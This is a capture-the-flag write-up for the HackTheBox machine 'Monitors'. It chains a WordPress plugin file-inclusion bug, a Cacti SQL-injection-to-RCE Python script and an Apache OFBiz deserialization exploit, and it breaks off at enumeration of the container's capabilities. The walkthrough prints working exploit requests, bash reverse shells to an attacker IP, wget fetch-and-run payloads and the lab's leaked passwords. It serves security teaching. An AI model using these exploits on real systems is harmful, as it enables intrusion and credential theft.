---
title: HTB: Monitors
url: https://0xdf.gitlab.io/2021/10/09/htb-monitors.html
date: 2021-10-09T13:45:00+00:00
difficulty: Hard [40]
os: Linux
tags: ctf, htb-monitors, hackthebox, nmap, vhosts, wordpress, wpscan, wp-with-spritz, sqli, injection, exploitdb, password-reuse, lfi, apache-config, cacti, cve-2020-14295, python, systemd, crontab, docker, feroxbuster, solr, cve-2020-9496, ysoserial, docker-escape, kernel-module, oswe-like, oscp-plus-v2
---

![Monitors](https://0xdfimages.gitlab.io/img/monitors-cover.png)

Monitors starts off with a WordPress blog that is vulnerable to a local file include vulnerability that allows me to read files from system. In doing so, I’ll discover another virtual host serving a vulnerable version of Cacti, which I’ll exploit via SQL injection that leads to code execution. From there, I’ll identify a new service in development running Apache Solr in a Docker container, and exploit that to get into the container. The container is running privilieged, which I’ll abuse by installing a malicious kernel module to get access as root on the host.

## Box Info

| Name | [Monitors](https://hackthebox.com/machines/monitors)  [Monitors](https://hackthebox.com/machines/monitors) [Play on HackTheBox](https://hackthebox.com/machines/monitors) |
| --- | --- |
| Release Date | [24 Apr 2021](https://twitter.com/hackthebox_eu/status/1384862137697415170) |
| Retire Date | 09 Oct 2021 |
| OS | Linux Linux |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Monitors |
| Radar Graph | Radar chart for Monitors |
| First Blood User | 00:25:56[celesian celesian](https://app.hackthebox.com/users/114435) |
| First Blood Root | 01:18:54[xct xct](https://app.hackthebox.com/users/13569) |
| Creator | [TheCyberGeek TheCyberGeek](https://app.hackthebox.com/users/114053) |

## Recon

### nmap

`nmap` found two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@parrot$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.238
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-21 15:13 EDT
Warning: 10.10.10.238 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.238
Host is up (0.093s latency).
Not shown: 61815 closed ports, 3718 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 24.05 seconds
oxdf@parrot$ nmap -p 22,80 -sCV -oA scans/nmap-tcpscripts 10.10.10.238
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-21 15:15 EDT
Nmap scan report for 10.10.10.238
Host is up (0.092s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ba:cc:cd:81:fc:91:55:f3:f6:a9:1f:4e:e8:be:e5:2e (RSA)
|   256 69:43:37:6a:18:09:f5:e7:7a:67:b8:18:11:ea:d7:65 (ECDSA)
|_  256 5d:5e:3f:67:ef:7d:76:23:15:11:4b:53:f8:41:3a:94 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.21 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu 18.04 Bionic.

### Website - TCP 80

Trying to visit the website by IP address returns a simple message:

![image-20210422122319329](https://0xdfimages.gitlab.io/img/image-20210422122319329.png)

I did run a `wfuzz` to look for addition vhosts (`wfuzz -u http://10.10.10.238 -H "Host: FUZZ.monitors.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --hh 150`), but didn’t find anything.

I’ll add this to my `/etc/hosts` file:

```
10.10.10.238 monitors.htb

```

### monitors.htb - TCP 80

#### Site

The page is a blog about hardware monitoring:

![image-20210422122743417](https://0xdfimages.gitlab.io/img/image-20210422122743417.png)

I’ll note that it’s Powered by Wordpress, as well as the 2018 copyright (as a hint that there might be some older software running).

#### wpscan

Given that the site is WordPress, I’ll run `wpscan` with the following options:
- `--url http://monitors.htb/` - target site
- `-e ap,t,tt,u` - enumerate all plugins, popular themes, timthumbs, and users
- `--api-token $WPSCAN_API` - use the API token I have for the free plan (can register [here](https://wpscan.com/register))

It returns a lot of stuff. There are 9 vulnerabilities identified in the core WordPress version, 5.5.1, but none are useful to me (arbitrary deletion, change theme background, denial of service). I could come back and poke at these more, but there’s also a plugin identified:

```

[i] Plugin(s) Identified:

[+] wp-with-spritz
 | Location: http://monitors.htb/wp-content/plugins/wp-with-spritz/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2015-08-20T20:15:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: WP with Spritz 1.0 - Unauthenticated File Inclusion
 |     References:
 |      - https://wpscan.com/vulnerability/cdd8b32a-b424-4548-a801-bbacbaad23f8
 |      - https://www.exploit-db.com/exploits/44544/
 |
 | Version: 4.2.4 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://monitors.htb/wp-content/plugins/wp-with-spritz/readme.tx

```

Unauthenticated file inclusion is definitely something I’ll want to look into.

## Shell as www-data

### File Read

#### POC

The [exploitDB link](https://www.exploit-db.com/exploits/44544) shows that the following code is present in the plugin:

```

if(isset($_GET['url'])){
$content=file_get_contents($_GET['url']);

```

It also gives two examples as proof of concepts:

```

/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd
/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=http(s)://domain/exec

```

Starting with the first one, I’ll confirm I can grab `/etc/passwd` from Monitors:

```

oxdf@parrot$ curl -s http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...[snip]...
marcus:x:1000:1000:Marcus Haynes:/home/marcus:/bin/bash
Debian-snmp:x:112:115::/var/lib/snmp:/bin/false
mysql:x:109:114:MySQL Server,,,:/nonexistent:/bin/false

```

marcus and root look like the only users with shells.

There’s not a ton I can do with the second remote include, as PHP is calling `file_get_contents`, so even if I pass in PHP code, it won’t be executed. If this were a Windows server, I could try to get something over SMB and collect the NetNTLMv2 challenge.

#### Enumeration

With access to the file system, I’ll look at various files that might contain useful information. I tried to get `/var/www/html/wp-config.php` to get the DB password and username, but nothing came back. That could be the wrong directory.

To find where on the file system the websites are rooted, I’ll look into the Apache `sites-enabled`. The default is `/etc/apache2/sites-enabled/000-default.conf`, and that works:

```

# Default virtual host settings
# Add monitors.htb.conf
# Add cacti-admin.monitors.htb.conf

<VirtualHost *:80>
        # The ServerName directive sets the request scheme, hostname and port that
        # the server uses to identify itself. This is used when creating
        # redirection URLs. In the context of virtual hosts, the ServerName
        # specifies what hostname must appear in the request's Host: header to
        # match this virtual host. For the default virtual host (this file) this
        # value is not decisive as it is used as a last resort host regardless.
        # However, you must set it for any further virtual host explicitly.
        #ServerName www.example.com

        ServerAdmin admin@monitors.htb
        DocumentRoot /var/www/html
        Redirect 403 /
        ErrorDocument 403 "Sorry, direct IP access is not allowed. <br><br>If you are having issues accessing the site then contact the website administrator: admin@monitors.htb"
        UseCanonicalName Off
        # Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
        # error, crit, alert, emerg.
        # It is also possible to configure the loglevel for particular
        # modules, e.g.
        #LogLevel info ssl:warn

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined

        # For most configuration files from conf-available/, which are
        # enabled or disabled at a global level, it is possible to
        # include a line for only one particular virtual host. For example the
        # following line enables the CGI configuration for this host only
        # after it has been globally disabled with "a2disconf".
        #Include conf-available/serve-cgi-bin.conf
</VirtualHost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet

```

That site covers IP access and the message saying IP access isn’t allowed. There’s also a comment at the top giving the names of two more files, `monitors.htb.conf` and `cacti-admin.monitors.htb.conf`

I’ll need to grab those. `monitors.htb.conf` (default comments removed) configures the WordPress site:

```

<VirtualHost *:80>
        ServerAdmin admin@monitors.htb
        ServerName monitors.htb
        ServerAlias monitors.htb
        DocumentRoot /var/www/wordpress
    
        ErrorLog ${APACHE_LOG_DIR}/error.log
</VirtualHost>

```

`cacti-admin.monitors.htb.conf` (default comments removed) is new to me:

```

<VirtualHost *:80>
        ServerAdmin admin@monitors.htb
        ServerName cacti-admin.monitors.htb
        DocumentRoot /usr/share/cacti
        ServerAlias cacti-admin.monitors.htb

        ErrorLog /var/log/cacti-error.log
        CustomLog /var/log/cacti-access.log common
</VirtualHost>

```

This provides two things to look into:
1. Re-check for wordpress configs in `/var/www/wordpress`
2. Enumerate `cacti-admin.monitors.htb`

#### WordPress

On fetching the WordPress config from `http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../../var/www/wordpress/wp-config.php`, it contains the DB creds:

```

/** The name of the database for WordPress */                                   
define( 'DB_NAME', 'wordpress' );                                               
                                        
/** MySQL database username */                                                  
define( 'DB_USER', 'wpadmin' );
                                                                                
/** MySQL database password */          
define( 'DB_PASSWORD', 'BestAdministrator@2020!' ); 

```

Unfortunately, this password doesn’t log into `http://monitors.htb/wp-login.php` or SSH as marcus. I’ll keep them for later potential uses.

### Cacti

#### Site / Login

This site is an instance of [Cacti](https://www.cacti.net/index.php), a network graphing tool. I’m getting a login page:

![image-20210422131822235](https://0xdfimages.gitlab.io/img/image-20210422131822235.png)

The creds from the WordPress database work here with the username admin, and password “BestAdministrator@2020!”.

![image-20210422131916315](https://0xdfimages.gitlab.io/img/image-20210422131916315.png)

#### Vulnerabilities

`searchsploit` has a bunch for Cacti, but all for earlier versions. Some googling, I found two CVEs related to SQL injections in Cacti, [CVE-2020-14295](https://nvd.nist.gov/vuln/detail/CVE-2020-14295) and [CVE-2020-35701](https://www.cybersecurity-help.cz/vdb/SB2021012717). Each of those reference an issue on the Cacti GitHub, [3622](https://github.com/Cacti/cacti/issues/3622) and [4022](https://github.com/Cacti/cacti/issues/4022) respectively. There’s not a ton of info in the second one, but the first has details on not only SQLi, but how to turn that into RCE.

### Exploit SQLi –> RCE

#### SQLI POC

Following the POC in the issue, there is an injection into `/cacti/color.php`, in the `filter` parameter. I should be able to visit `/cacti/color.php?action=export&header=false&filter=1')+UNION+SELECT+1,username,password,4,5,6,7+from+user_auth;--+-` and get back a list of usernames and passwords. It works:

[![image-20210422140023940](https://0xdfimages.gitlab.io/img/image-20210422140023940.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20210422140023940.png)

It POC also shows that I could stack queries, putting another query after the `;`. In the example, it does an `update` to change one of the users username, but I don’t need that.

#### RCE POC

I could enumerate the DB from there, but the POC in the GitHub issue goes on. The idea here is to stack a second query that updates the `path_php_binary` column in the `settings` table, and then trigger that to be executed. In the example, the author uses a `touch` commands to show it works. I’ll use a `ping`.

```

/cacti/color.php?action=export&header=false&filter=1')+UNION+SELECT+1,username,password,4,5,6,7+from+user_auth;update+settings+set+value='ping+-c+1+10.10.14.7;'+where+name='path_php_binary';--+-

```

Now with `tcpdump` running, I’ll visit `http://cacti-admin.monitors.htb/cacti/host.php?action=reindex` to trigger, and Monitors sends ICMP packets:

```

oxdf@parrot$ sudo tcpdump -i tun0 -n icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
14:04:37.782418 IP 10.10.10.238 > 10.10.14.7: ICMP echo request, id 3035, seq 1, length 64
14:04:37.782445 IP 10.10.14.7 > 10.10.10.238: ICMP echo reply, id 3035, seq 1, length 64

```

#### Difficulties

The hardest part of getting a shell for me was learning a quirk about the RCE and how the `host.php` trigger worked. I was set up with the request to do the SQL injection in one Burp Repeater window, and the trigger via `host.php` in another. I noticed that even after I changed the payload, I was still getting pings.

I updated the injection request to print what was in the `path_php_binary` variable before it changed it:

```

/cacti/color.php?action=export&header=false&filter=1')+UNION+SELECT+1,name,value,4,5,6,7+from+settings+where+name='path_php_binary';update+settings+set+value='nc+10.10.14.7+443'+where+name='path_php_binary';--+- 

```

In doing this, I could see that I was successfully changing the database, but still getting the original pings.

It seems that no matter what the DB says, the actually binary will would only update once per session. So once I visited `host.php` to trigger, if I wanted to trigger again, I needed to log out and back in, and then it would work.

#### Script

Because that involved a lot of clicking, I wrote a script to do it. There are four steps:
- Get the CSRF token from the login page
- Login
- SQLi
- Trigger

```

#!/usr/bin/env python3

import re
import requests
import sys
import urllib.parse

payload = urllib.parse.quote(sys.argv[1]) + ';'

sess = requests.Session()
sess.proxies.update({'http': 'http://127.0.0.1:8080'})

# get CSRF
resp = sess.get("http://cacti-admin.monitors.htb/cacti/index.php")
csrf = re.search(r"csrfMagicToken='(.*)'", resp.text).group(1)
print(f"Got CSRF: {csrf}")

# login
resp = sess.post("http://cacti-admin.monitors.htb/cacti/index.php",
        data = {
            '__csrf_magic':   csrf,
            'action':         'login',
            'login_username': 'admin',
            'login_password': 'BestAdministrator@2020!',
            })

print(f"[+] Logged in with cookie: {sess.cookies['Cacti']}")

# upload command
resp = sess.get(f"http://cacti-admin.monitors.htb/cacti/color.php?action=export&header=false&filter=1')+UNION+SELECT+1,username,password,4,5,6,7+from+user_auth;update+settings+set+value='{payload}'+where+name='path_php_binary';--+-")

# trigger
resp = sess.get("http://cacti-admin.monitors.htb/cacti/host.php?action=reindex")

```

Because I do that in a clean session each time, the trigger works each time. For example, changing the `ping` command to `-c 2`:

```

oxdf@parrot$ python3 rce.py 'ping -c 2 10.10.14.7'
[+] Got CSRF: sid:7977064a20e40e119ef70c83e5b45122c75688bb,1619176652;ip:3f4eb84c44fb6969f0c21b517d000b79ddae3d2e,1619176652
[+] Logged in with cookie: h6a28jimfsuaaef2h123csat2o
[+] Uploaded payload
[+] Triggered payload

```

There are two pings at `tcpdump`:

```

07:17:32.695990 IP monitors.htb > 10.10.14.7: ICMP echo request, id 6432, seq 1, length 64
07:17:32.696070 IP 10.10.14.7 > monitors.htb: ICMP echo reply, id 6432, seq 1, length 64
07:17:33.697849 IP monitors.htb > 10.10.14.7: ICMP echo request, id 6432, seq 2, length 64
07:17:33.697895 IP 10.10.14.7 > monitors.htb: ICMP echo reply, id 6432, seq 2, length 64

```

### Shell

The script actually works as is to get a Bash reverse shell:

```

oxdf@parrot$ python3 rce.py 'bash -c "bash -i >& /dev/tcp/10.10.14.7/443 0>&1"'
[+] Got CSRF: sid:639ec65d813f5784fe4bb82daad753ff2561d247,1619176753;ip:a92d67e8550d3415eb2ab371711c94fa01ef2005,1619176753
[+] Logged in with cookie: 9pl7kv48dc195jkqcon9v3tvs1
[+] Uploaded payload

```

At this point it hangs, but at a `nc` listener:

```

oxdf@parrot$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.238] 38374
bash: cannot set terminal process group (1504): Inappropriate ioctl for device
bash: no job control in this shell
www-data@monitors:/usr/share/cacti/cacti$

```

I’ll use the standard Python PTY trick to upgrade the shell:

```

www-data@monitors:/usr/share/cacti/cacti$ python3 -c 'import pty;pty.spawn("bash")'
<ti/cacti$ python3 -c 'import pty;pty.spawn("bash")'
www-data@monitors:/usr/share/cacti/cacti$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@parrot$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@monitors:/usr/share/cacti/cacti$

```

## Shell as marcus
*Actually getting to Marcus is not at all necessary to root the box. I’ll use SSH port forwarding as marcus in the next step, but that could easily be [Chisel](https://github.com/jpillora/chisel) as www-data to the same end.*

### Enumeration

#### Home Directory

marcus is the only user in `/home` (matching what was in `/etc/passwd` from the LFI). Looking at the files in `/home/marcus`, there are two things that jump out:

```

www-data@monitors:/home/marcus$ ls -la
total 40
drwxr-xr-x 5 marcus marcus 4096 Jan 25 15:39 .
drwxr-xr-x 3 root   root   4096 Nov 10 17:00 ..
d--x--x--x 2 marcus marcus 4096 Nov 10 18:21 .backup
lrwxrwxrwx 1 root   root      9 Nov 10 18:30 .bash_history -> /dev/null
-rw-r--r-- 1 marcus marcus  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 marcus marcus 3771 Apr  4  2018 .bashrc
drwx------ 2 marcus marcus 4096 Jan 25 15:39 .cache
drwx------ 3 marcus marcus 4096 Nov 10 17:00 .gnupg
-rw-r--r-- 1 marcus marcus  807 Apr  4  2018 .profile
-r--r----- 1 root   marcus   84 Jan 25 14:59 note.txt
-r--r----- 1 root   marcus   33 Nov 10 18:29 user.txt

```
1. `user.txt` and `note.txt` have permissions that make them readable by marcus, so I’ll need to escalate to access them.
2. `.backup` is a directory with `--x--x--x`. `x` for a [directory](https://ryanstutorials.net/linuxtutorial/permissions.php#directories) means the user can enter the directory, but without `r`, they can’t list files.

```

www-data@monitors:/home/marcus$ cd .backup/
www-data@monitors:/home/marcus/.backup$ ls
ls: cannot open directory '.': Permission denied

```

I could spend some time guessing at file names in the directory (and perhaps even guess the file I need to find), but I’ll move on for now.

#### Services

After manual checks for `sudo` (`sudo -l`) and SUID (`find / -type f -perm -2000 -o -perm -4000 -ls 2>/dev/null`) didn’t return anything interesting, poking around I found an interesting service:

```

www-data@monitors:/etc/systemd/system$ cat cacti-backup.service 
[Unit]
Description=Cacti Backup Service
After=network.target

[Service]
Type=oneshot
User=www-data
ExecStart=/home/marcus/.backup/backup.sh

[Install]
WantedBy=multi-user.target

```

In fact, it’s being run at reboot in a system cron as www-data from `/etc/crontab`:

```

# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
@reboot www-data /usr/sbin/service cacti-backup start

```

It’s being run as www-data, so that’s not a vector to escalate, but it does leak the name of the script being run from `/home/marcus/.backup`. It looks like that Cron has been deleted since I solved the box, but it doesn’t matter either way.

#### backup.sh

The script is very simple:

```

www-data@monitors:/home/marcus/.backup$ cat backup.sh
#!/bin/bash

backup_name="cacti_backup"
config_pass="VerticalEdge2020"

zip /tmp/${backup_name}.zip /usr/share/cacti/cacti/*
sshpass -p "${config_pass}" scp /tmp/${backup_name} 192.168.1.14:/opt/backup_collection/${backup_name}.zip
rm /tmp/${backup_name}.zip

```

It creates a Zip archive of the `/usr/share/cacti/cacti` directory, uses `scp` to copy that zip to another system, and then deletes the archive. It also has a password.

### su

That password works for marcus on Monitors, both in `su` and with `ssh`:

```

www-data@monitors:/home/marcus/.backup$ su marcus -
Password: 
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
marcus@monitors:~/.backup$

```

And gives access to `user.txt`:

```

marcus@monitors:~$ cat user.txt
96cd8f28************************

```

## Shell as root in container

### Enumeration

#### Identify Docker

The `note.txt` in marcus’ home directory has a todo list:

```

TODO:

Disable phpinfo in php.ini              - DONE
Update docker image for production use  - 

```

There’s a reference to a docker image and that it’s not ready for production.

There’s a `docker-proxy` in the process list that shows an image listening on 8443 on localhost:

```

root       2084  0.0  0.0 479380  4000 ?        Sl   Apr22   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8443 -container-ip 172.17.0.2 -container-port 8443

```

I could have actually discovered this as www-data and used something like [Chisel](https://github.com/jpillora/chisel) to access the page, but now with SSH I’ll use SSH port forwarding.

```

oxdf@parrot$ sshpass -p "VerticalEdge2020" ssh marcus@10.10.10.238 -L 8443:localhost:8443
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-142-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Apr 23 12:01:31 UTC 2021

  System load:  0.1                Users logged in:                1
  Usage of /:   34.9% of 17.59GB   IP address for ens160:          10.10.10.238
  Memory usage: 52%                IP address for docker0:         172.17.0.1
  Swap usage:   0%                 IP address for br-968a1c1855aa: 172.18.0.1
  Processes:    198
 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

2 packages can be updated.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Fri Apr 23 10:37:32 2021 from 10.10.14.7
marcus@monitors:~$

```

I use `sshpass` so I can keep the password on the command line, and `-L 8443:localhost:8443` means that anything I send to 8443 on my VM will be forwarded through the SSH session, and sent out from Monitors to localhost:8443.

#### Tomcat

On visiting `https://localhost:8443/` in Firefox, the site returns a 404:

![image-20210423080349939](https://0xdfimages.gitlab.io/img/image-20210423080349939.png)

The page shows it’s running Tomcat version 9.0.31. Neither `searchsploit` nor Google turned up any interesting vulnerabilities in that version.

I ran [FeroxBuster](https://github.com/epi052/feroxbuster) against the site, and it found a *ton* of stuff. I killed the search after a minute with 30000+ pages found:

```

oxdf@parrot$ feroxbuster -u https://127.0.0.1:8443 -k                                                                       
                                                                                                                                                                
 ___  ___  __   __     __      __         __   ___                                                                                                              
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__                                                                                                               
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___                                                                                                              
by Ben "epi" Risher 🤓                 ver: 2.2.1                                                                                                               
───────────────────────────┬──────────────────────                                                                                                              
 🎯  Target Url            │ https://127.0.0.1:8443                                                                                                             
 🚀  Threads               │ 50                                                                                                                                 
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt                                                              
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]                                                                                      
 💥  Timeout (secs)        │ 7                                                                                                                                  
 🦡  User-Agent            │ feroxbuster/2.2.1                                                                                                                  
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml                                                                                                 
 🔓  Insecure              │ true                                                                                                                               
 🔃  Recursion Depth       │ 4                                                                                                                                  
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest                                                                              
───────────────────────────┴──────────────────────
...[snip]...
[#####>--------------] - 1m     57791/209993  4m      found:30487   errors:0      
[#########>----------] - 1m     14093/29999   134/s   https://127.0.0.1:8443
[#######>------------] - 1m     11006/29999   112/s   https://127.0.0.1:8443/contentimages
[########>-----------] - 1m     12663/29999   132/s   https://127.0.0.1:8443/accounting
[#####>--------------] - 1m      8979/29999   112/s   https://127.0.0.1:8443/solr
[####>---------------] - 1m      7016/29999   105/s   https://127.0.0.1:8443/partymgr
[#>------------------] - 36s     2184/29999   60/s    https://127.0.0.1:8443/common
[#>------------------] - 27s     1847/29999   68/s    https://127.0.0.1:8443/marketing

```

I could go back and configure it to just do a depth of 1, but before doing that, I checked out `/solr`. It turns out any of the pages will redirect to a login page:

![image-20210423081218311](https://0xdfimages.gitlab.io/img/image-20210423081218311.png)

At the bottom right it says “Powered by Apache OFBiz. Release 17.12.01”.

#### Exploits

Searching for “OFBiz exploit” returns a good number of results. There’s an interesting password reset CSRF, but that doesn’t seem to apply here. [This post from Zero Day Initiative](https://www.zerodayinitiative.com/blog/2020/9/14/cve-2020-9496-rce-in-apache-ofbiz-xmlrpc-via-deserialization-of-untrusted-data) looks interesting. It’s a Java deserialization issue at `/webtools/control/xmlrpc`, and the vulnerability is unauthenticated.

Visiting `https://localhost:8443/webtools/control/xmlrpc` returns a error:

![image-20210423081808874](https://0xdfimages.gitlab.io/img/image-20210423081808874.png)

This is promising, as it shows the endpoint is there and that I didn’t get any permissions errors, just an error that I didn’t submit the proper request.

The blog post goes into really good detail of exactly where the vulnerability it, and then concludes with:

> To trigger the vulnerability, an attacker would send an HTTP request containing a crafted serialized object in an XML format to the affected target. The vulnerability is triggered when the server deserializes the XML data.

### Exploit

#### Find POC

A search for “CVE-2020-9496 POC” returns [this Packetstrom post](https://packetstormsecurity.com/files/161769/Apache-OFBiz-XML-RPC-Java-Deserialization.html) for a Metasploit module exploiting this vulnerability. The important part is the `send_request_xmlrpc` function:

```

  def send_request_xmlrpc(data)
    # http://xmlrpc.com/
    # https://ws.apache.org/xmlrpc/
    send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/webtools/control/xmlrpc'),
      'ctype' => 'text/xml',
      'data' => <<~XML
        <?xml version="1.0"?>
        <methodCall>
          <methodName>#{rand_text_alphanumeric(8..42)}</methodName>
          <params>
            <param>
              <value>
                <struct>
                  <member>
                    <name>#{rand_text_alphanumeric(8..42)}</name>
                    <value>
                      <serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">#{Rex::Text.encode_base64(data)}</serializable>
                    </value>
                  </member>
                </struct>
              </value>
            </param>
          </params>
        </methodCall>
      XML
    )
  end

```

#### Find Payload

I’ll download [ysoserial](https://github.com/frohoff/ysoserial) (`sudo wget https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar -O /usr/local/bin/ysoserial` and `sudo +x /usr/local/bin/ysoserial`) to generate Java serialized payloads. The trick with yso is always finding the right set of gadgets to use (Payload). I’ll typically try a bunch, starting with the `CommonsCollection` ones, and then other `Commons` ones.

I’ll get a request that looks like this in Burp Repeater:

```

POST /webtools/control/xmlrpc HTTP/1.1
Host: localhost:8443
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: JSESSIONID=6BED6745363C7728AAE4274F77E4B6D2.jvm1; OFBiz.Visitor=10000
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: test/xml
Content-Length: 3145

<?xml version="1.0"?>
<methodCall>
  <methodName>0xdf0xdf</methodName>
  <params>
    <param>
      <value>
        <struct>
          <member>
            <name>0xdf0xdf</name>
            <value>
              <serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">[yso output here]</serializable>
            </value>
          </member>
        </struct>
      </value>
    </param>
  </params>
</methodCall>

```

Then, for each Payload to try, I can run `ysoserial CommonsCollections5 'ping -c 1 10.10.14.7' | base64 -w 0` and paste that into the `<serializable>` tag and submit, and watch `tcpdump` for a ping.

None of the `CommonsCollections` worked, but `CommonsBeanutils1` did!

#### Check for wget/curl

I’ve had really bad luck with complicated commands like reverse shells via Java deserialization. I’d much rather upload a Bash script and then run it. For that, I’ll want to see if `wget` or `curl` can contact my host.

Start with a payload:

```

oxdf@parrot$ ysoserial CommonsBeanutils1 'wget 10.10.14.7' | base64 -w 0
...[snip]...

```

Start Python webserver, and send the payload from Burp. The webserver gets a hit:

```

oxdf@parrot$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.238 - - [23/Apr/2021 08:42:30] "GET / HTTP/1.1" 200 -

```

#### Reverse Shell

I’ll use two payloads to get a shell. I’ll write `rev.sh`:

```

#!/bin/bash

bash -i >& /dev/tcp/10.10.14.7/443 0>&1

```

First, I’ll upload it to the container with `wget`:

```

oxdf@parrot$ ysoserial CommonsBeanutils1 'wget 10.10.14.7/rev.sh' | base64 -w 0

```

Once that succeeds (I’ll see the 200 at the Python webserver), then I’ll execute it:

```

oxdf@parrot$ ysoserial CommonsBeanutils1 'bash rev.sh' | base64 -w 0

```

On sending that through Burp, a shell comes back:

```

oxdf@parrot$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.238] 37802
bash: cannot set terminal process group (30): Inappropriate ioctl for device
bash: no job control in this shell
root@335bd6937366:/usr/src/apache-ofbiz-17.12.01# 

```

`python3` isn’t installed, but `python` is:

```

root@335bd6937366:/usr/src/apache-ofbiz-17.12.01# python -c 'import pty;pty.spawn("bash")'
<-17.12.01# python -c 'import pty;pty.spawn("bash")'
root@335bd6937366:/usr/src/apache-ofbiz-17.12.01# ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@parrot$ stty raw -echo ; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
root@335bd6937366:/usr/src/apache-ofbiz-17.12.01# 

```

## Shell as root

### Enumeration

`capsh --print` will show the capabilities currently available inside the container:

```

root@335bd6937366:/# capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+eip
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
